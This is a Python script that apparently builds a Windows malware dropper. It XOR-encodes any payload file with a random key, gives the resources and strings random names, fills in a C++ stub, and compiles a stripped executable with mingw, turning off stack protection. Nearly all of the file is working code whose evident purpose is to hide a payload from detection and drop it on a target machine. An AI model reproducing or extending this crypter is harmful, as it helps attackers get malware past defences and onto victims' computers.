# Author: Nemuel Wainaina

import os, random, shutil, string

import stub


# generate and return a random alphanumeric string
def random_str(length=3):
    pool = string.ascii_letters + string.digits
    result = ''
    for i in range(length): result += random.choice(pool)
    return result

# XOR encode a string
def xor_encode_str(data, key):
    result = []
    for i, ch in enumerate(data):
        encoded = hex(ord(ch) ^ ord(key[i % len(key)]))
        result.append(encoded)
    result.append(hex(0))
    return '{' + ', '.join(result) + '}'

# XOR encode a bytes object
def xor_encode_bytes(data, key):
    return bytes([data[i] ^ ord(key[i % len(key)]) for i in range(len(data))])

# pack a 3-character key into little-endian int
def encode_key(key):
    if len(key) != 3: raise ValueError('key must be 3 characters long')
    result = '0x00'
    key = key[::-1]
    for c in key: result += str(hex(ord(c)))[2:]
    return result

def config_stub(key, payload_rsrc_name, payload_file_name):
    enc_key = encode_key(key)
    stub_body = stub.body
    stub_body = stub_body.replace('!ENCODED_KEY!', enc_key)
    stub_strings = stub.strings
    stub_strings['payloadRsrcName'] = payload_rsrc_name
    stub_strings['payloadName'] = f'\\{payload_file_name}'
    for k in stub_strings.keys():
        stub_body = stub_body.replace(f'!{k}!', xor_encode_str(stub_strings[k], key))
    stub_rc_file = stub.rc_file
    stub_rc_file = stub_rc_file.replace('!payload!', payload_rsrc_name)
    return stub_body, stub_rc_file

def protect(payload_file, output_file=None, build_dir='builds'):
    build_id = random_str(7)

    key = random_str(3)
    payload_rsrc_name = random_str(random.randint(3, 5))
    payload_ext = payload_file.split('.')[-1]
    payload_file_name = f'{random_str(random.randint(5, 10))}.{payload_ext}'
    payload_enc = xor_encode_bytes(open(payload_file, 'rb').read(), key)

    if not os.path.exists(build_dir): os.mkdir(build_dir)
    build_path = f'{build_dir}/{build_id}'
    os.mkdir(build_path)
    payload_rsrc_file = f'{build_path}/payload.bin'
    open(payload_rsrc_file, 'wb').write(payload_enc)

    stub_body, stub_rc_file = config_stub(key, payload_rsrc_name, payload_file_name)
    for ext, code in zip(('cpp', 'rc'), (stub_body, stub_rc_file)):
        open(f'{build_path}/{build_id}.{ext}', 'w').write(code)

    # -fno-stack-check -fno-stack-protector -nostartfiles -nostdlib -Wl,--strip-all -Wl,--entry=EntryPoint
    build_cmds = [
        f'x86_64-w64-mingw32-windres {build_path}/{build_id}.rc -o {build_path}/{build_id}.o',
        f'x86_64-w64-mingw32-g++ -mwindows -fno-stack-check -fno-stack-protector -nostartfiles -nostdlib -Wl,--strip-all -Wl,--entry=EntryPoint {build_path}/{build_id}.cpp {build_path}/{build_id}.o -o {build_path}/{build_id}.exe']
    strip_dropper = f'strip {build_path}/{build_id}.exe'
    for cmd in (*build_cmds, strip_dropper):
        os.system(cmd)
    result = f'{build_path}/{build_id}.exe'

    if output_file:
        shutil.move(result, output_file)
        shutil.rmtree(f'{build_dir}/{build_id}')
        return output_file
    else:
        return result
